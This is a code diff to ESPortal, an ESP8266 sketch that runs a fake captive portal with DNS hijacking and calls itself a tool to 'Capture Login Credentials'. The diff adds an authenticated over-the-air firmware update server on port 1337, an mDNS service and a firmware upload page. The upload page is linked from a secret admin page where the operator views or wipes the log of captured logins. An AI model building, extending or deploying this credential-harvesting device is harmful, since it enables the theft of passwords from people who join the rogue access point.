@@ -10,7 +10,9 @@
 #include <ESP8266WiFi.h>
 #include <WiFiClient.h>
 #include <ESP8266WebServer.h>
+#include <ESP8266HTTPUpdateServer.h>
 #include <DNSServer.h>
+#include <ESP8266mDNS.h>
 #include <FS.h>
 #include "config.h"
 #include "site1.h"
@@ -24,11 +26,15 @@ const byte DNS_PORT = 53;
 IPAddress apIP(192, 168, 1, 1);
 DNSServer dnsServer;
 ESP8266WebServer webServer(80);
+ESP8266WebServer httpServer(1337);
+ESP8266HTTPUpdateServer httpUpdater;
+
+const char* update_path = "/update";
 
 // Dish out Secret ESPortal Web Page
 // located at anywebsite.com/esportal
 void handle_portal() {
-  webServer.send(200, "text/html", "<html><body>ESPortal - Capture Login Credentials<br>Written by:<br>Corey Harding from www.LegacySecurityGroup.com<br>-----<br><a href=\"/esportal/log\">View /log.txt</a></html><br>-<br><a href=\"/esportal/wipe\">Wipe /log.txt</a><br>-<br><a href=\"/esportal/format\">Format File System</a></html>");
+  webServer.send(200, "text/html", "<html><body>ESPortal - Capture Login Credentials<br>Written by:<br>Corey Harding from www.LegacySecurityGroup.com<br>-----<br><a href=\"/esportal/log\">View /log.txt</a></html><br>-<br><a href=\"/esportal/wipe\">Wipe /log.txt</a><br>-<br><a href=\"/esportal/format\">Format File System</a><br>-<br><a href=\"/firmware\">Upgrade ESPortal Firmware</a></html>");
 }
 String webString="";
 String serialString="";
@@ -167,10 +173,18 @@ void setup() {
     SPIFFS.format();
     Serial.println(" Success");
   });
+
+  webServer.on("/firmware", [](){
+    webServer.send(200, "text/html", String()+"<html><body style=\"height: 100%;\"><a href=\"/esportal\"><- BACK TO INDEX</a><br><br>Open Arduino IDE.<br>Pull down Sketch Menu then select Export Compiled Binary.<br>Open Sketch Folder and upload the exported BIN file.<br>You may need to manually reboot the device to reconnect.<br><iframe style =\"border: 0; height: 100%;\" src=\"http://"+PORTALLOGIN+":1337/update\"><a href=\"http://"+PORTALLOGIN+":1337/update\">Click here to Upload Firmware</a></iframe></body></html>");
+  });
   
   //Start Webserver
   Serial.print("Starting web server...");
   webServer.begin();
+  httpUpdater.setup(&httpServer, update_path, update_username, update_password);
+  httpServer.begin();
+
+  MDNS.addService("http", "tcp", 1337);
   Serial.println(" Success!");
 }
 
@@ -178,4 +192,5 @@ void loop() {
   //Check for DNS Request/Dish out Web Pages
   dnsServer.processNextRequest();
   webServer.handleClient();
+  httpServer.handleClient();
 }
